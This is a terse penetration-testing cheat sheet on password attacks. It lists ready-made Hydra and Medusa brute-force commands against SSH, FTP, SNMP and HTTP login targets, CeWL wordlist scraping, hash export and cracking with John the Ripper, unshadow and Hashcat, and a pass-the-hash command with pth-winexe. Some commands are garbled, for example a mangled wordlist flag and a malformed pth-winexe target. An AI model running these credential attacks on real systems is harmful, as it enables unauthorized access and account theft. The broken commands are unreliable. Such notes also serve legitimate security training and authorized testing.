# Password attacks

#### `usr/share/wordlists`

### Brute force

#### Medusa

```text
medusa -h 10.11.1.219 -u admin -P password.txt -M http -m DIR:/admin -T 10
```

#### Hydra

```text
hydra -P password.txt -v 10.11.1.210 snmp
hydra -l admin -P password.txt -v 122.168.31.219 ftp
hydra -l root -P password.txt 10.11.1.219 ssh
hydra -L users.txt -P password.txt 10.10.219.253 www-get /admin
```

### CeWL - scraping webpages

CeWL is a ruby tool that spiders webpages and outputs wordlists for use  other brute tools.

```text
cewl [options] <url>
Example: cewl -m 6 -w megacorp-cewl.txt www.megacorpone.com
-d = depth to spider, default 2
-m = minimum word length, default 3
-w = write the output to file, include file name
-c = count, show word count for each word entry
-v = verbose
```

### Hash attacks

Exporting hashes: PWDump, Fgdump, Windows Credential Editor \(WCE.exe\)

Cracking hashes: John the Ripper

Raw: `john 127.0.0.1 pwdump (slow)`

With wordlist: `john â€“wordlist=/usr/share/wordlists/rockyou.txt`

On Linux: combine the passwd and shadow files prior to cracking

`unshadow passwd-file.txt shadow-file.txt`

### Hashcat

**Check for mode on wiki page**  [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

```text
hashcat -m (mode) -a 0 hash.txt Pass.txt
```

### Passing the hash \(Windows\)

Create environment variable SMBHASH, containing hash we want to pass

`export SMBHASH=hashvalue`

`Use pth-winexe to authenticate: pth-winexe -U administrator% //10.11.0.1.76.cmd`

